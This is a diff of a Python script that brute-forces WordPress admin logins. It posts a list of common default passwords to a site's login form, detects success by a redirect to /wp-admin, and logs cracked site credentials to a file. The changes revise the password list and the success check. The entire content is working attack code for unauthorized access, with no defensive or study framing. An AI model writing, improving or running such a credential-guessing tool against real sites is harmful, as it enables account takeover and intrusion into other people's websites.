@@ -21,8 +21,7 @@ import requests
 
 found     = []
 file      = open("found.txt", "a")
-passwords = ["admin", "demo", "demo123", "password", "password123", "qwerty", "qwerty123",
-			 "administrator", "root", "pass", "pass123", "123456789"]
+passwords = ["admin", "193728465", "pass", "password", "admin123", "qwerty", "123", "123456789"]
 
 def brute(site, username="admin", control=False):
 	''' Try login to site with username:password '''
@@ -31,8 +30,8 @@ def brute(site, username="admin", control=False):
 		try:
 			payload = {"log": "admin", "pwd": pwd}
 			req = requests.post(site, data=payload, timeout=5)
-
-			if "dashboard" in req.text:
+			
+			if '/wp-admin' in req.url:
 				if control != False:
 					print "[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60)
 				else:
@@ -40,7 +39,7 @@ def brute(site, username="admin", control=False):
 				file.write("[+] Site: %s\n\t[*] Username: %s\n\t[*] Password: %s\n%s\n"%(site, username, pwd, "-"*60))
 				file.flush()
 				found.append((site, username, pwd))
-				return
+				break
 
 		except:
 			return
